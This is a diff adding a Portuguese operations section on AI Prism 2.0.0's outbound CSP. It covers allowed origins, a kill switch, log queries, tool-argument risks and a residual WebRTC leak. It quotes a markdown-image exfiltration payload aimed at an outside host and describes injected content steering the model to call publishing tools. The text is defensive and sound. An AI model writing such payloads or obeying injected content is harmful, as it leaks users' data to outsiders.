@@ -1,4 +1,4 @@
-<!-- i18n: source=docs/operations.md source-hash=59070b8b7354af025c1896ea0fadeeebabab0898 status=current -->
+<!-- i18n: source=docs/operations.md source-hash=c0cdc18f23398bb2c401e4d9b0e141899ffe1da7 status=current -->
 # Operação do AI Prism
 
 [English](../operations.md) · **Português (Brasil)** · [Español](../es/operations.md)
@@ -1033,6 +1033,39 @@ Visto ao vivo; a permissão resolveu.
 desfecho "sai desligado porque o gateway não repassa" nem a origem de sandbox dedicada. O recurso continua saindo desligado por
 padrão, como projetado. O que esta verificação não cobriu: capturar uma View em um turno de chat real (exige um serviço com
 credencial por usuário ou com a identidade Databricks de quem chama) e a View rodando sua ponte dentro de uma conversa real.
+
+---
+
+### 6.17 CSP de saída (2.0.0): permitir uma origem, interruptor de emergência, ler os logs
+
+A partir da 2.0.0 o navegador carrega imagens, fontes, estilos, mídia, conexões e frames apenas do próprio app (mais `data:` e `blob:`). Um texto que o modelo ou uma ferramenta escreve em uma resposta, documento ou deck (`![x](https://host/p.png?d=<dados>)`) não consegue mais fazer o navegador chamar um host de fora sem nenhum clique. Versões anteriores à 2.0.0 não têm essa proteção: a resposta para "estamos expostos?" é **atualizar para a 2.0.0**.
+
+**Permitir uma origem (um design system que usa mesmo uma fonte ou imagem remota).**
+- **Cartão de admin, sem novo deploy:** Configurações > Administradores > *Origens externas de recursos*. Adicione uma origem `https://host[:porta]` (sem curinga, caminho, endereço IP nem host da Databricks) e salve. A mudança chega a todas as réplicas em cerca de 15 s e vale para páginas carregadas depois disso. Cada mudança entra na trilha de auditoria de admin (`egress.settings`).
+- **`app.yaml`, para infraestrutura como código:** `EXTERNAL_ASSET_ORIGINS` (origens separadas por espaço ou vírgula). É um piso: o cartão soma a ele e não consegue removê-lo. Uma entrada inválida é descartada, nunca emitida.
+- Uma origem permitida abre **só** `img-src`, `font-src` e `style-src`. Nunca abre `connect-src`, `media-src`, `frame-src`, `default-src` nem `script-src`. Tudo que uma origem permitida recebe em uma URL pode ser lido por quem a opera; adicione só hosts que a sua organização controla, nunca hospedagem compartilhada nem serviços de formulário ou de script. Um design system que precisa de uma biblioteca de script deve embuti-la no zip.
+
+**Interruptor de emergência.** `CSP_EGRESS=report` no `env` do `app.yaml` e redeploy **do mesmo build** (sem rebuild; o `config.env` do bundle não chega ao app). O valor precisa ser exatamente `report`: qualquer outro (`Report`, `report `, um erro de digitação) mantém a CSP aplicada e grava um aviso na subida. Ele remove só a parte do navegador: as diretivas de saída e de script saem do cabeçalho aplicado e a política Report-Only continua vigiando. Ele **não** desliga as outras camadas, que seguem ligadas: o marcador de imagem externa no chat e nos documentos, o sanitizador de decks (ao salvar e ao ler), a regra de URL do `web_fetch` e a regra do prompt de sistema. Use por pouco tempo, corrija a causa (em geral, uma origem a permitir) e remova.
+
+**Ler os logs** (`databricks apps logs <app> -p <PROFILE>`; cada linha é um objeto JSON, veja o [§2](#2-logs)):
+
+```bash
+# o navegador bloqueou um carregamento (enforce) ou bloquearia (report): só diretiva e origem, nunca caminho nem query
+grep -o '{"ts".*}' app.log | jq -r 'select(.msg | startswith("csp report:")) | .msg | sub("^csp report: "; "") | fromjson | [.disposition, .directive, .blocked, (.document // "")] | @tsv' | sort | uniq -c | sort -rn
+
+# o servidor removeu ou recusou uma referência externa: superfície, tipo e host
+grep -o '{"ts".*}' app.log | jq -r 'select(.msg | contains("egress_blocked")) | .msg | fromjson | [.surface, .kind, (.hosts | join(","))] | @tsv' | sort | uniq -c | sort -rn
+```
+
+- `csp_violation` (`csp report: {...}`): `directive` (`img-src`, `font-src`, `style-src`, `script-src`...), `blocked` (a origem, ou `inline`, `eval`, `data`, `blob`), `document` opcional (`about:srcdoc` para um frame) e `disposition` (`enforce` ou `report`). Há limite por usuário (`CSP_REPORT_PER_MIN`, padrão 60). Uma origem `blocked` recorrente vinda de um design system é o sinal para permiti-la; um host desconhecido que aparece logo depois de um turno do modelo é a tentativa que esta versão impede.
+- `egress_blocked`: `surface` (`answer`, `deck`, `document`, `web_fetch`), `kind` (`image`, `link`, `css`, `handler`, `url`), `hosts` (só nomes de host), `count`, `route` e `truncated` quando um teto de tamanho foi atingido. Há limite por usuário (`EGRESS_LOG_PER_MIN`, padrão 60; `0` = sem limite). `request_id` e `user_hash` vêm da requisição, então a linha se liga ao turno sem carregar o conteúdo.
+
+**Argumentos de ferramentas (o que a regra do navegador não cobre).** A CSP protege o navegador. Uma ferramenta roda no servidor e pode enviar o que o modelo lhe dá:
+- Mantenha restritiva a **política de rede serverless** do workspace, para que a ferramenta Python (função do UC) não tenha rede de saída. O app não consegue verificar isso por você.
+- Revise quais **ferramentas MCP externas** podem escrever ou publicar (postar mensagem, criar ticket, enviar e-mail, subir arquivo) e desative as que não são necessárias (as conexões MCP e a política de ferramentas em Configurações). Um conteúdo que o modelo leu pode pedir que ele as chame.
+- A **busca web** envia a consulta ao provedor que o admin escolheu ([web-search.md](web-search.md)). O `web_fetch` só abre uma URL que um usuário digitou ou que um resultado de `web_search`/`web_fetch` listou; outros resultados de ferramenta (Genie, MCP, arquivos) não contam.
+
+**Resíduo conhecido.** Script inline em um frame isolado (cartões de design system, slides) ainda pode abrir uma conexão WebRTC (um pacote STUN chegou a um listener de loopback em uma sonda no Chromium). A navegação do frame para um host de fora é bloqueada por `frame-src`. Fechar o WebRTC exige esses frames em origem e política próprias (previsto para a 2.x).
 
 ---
 
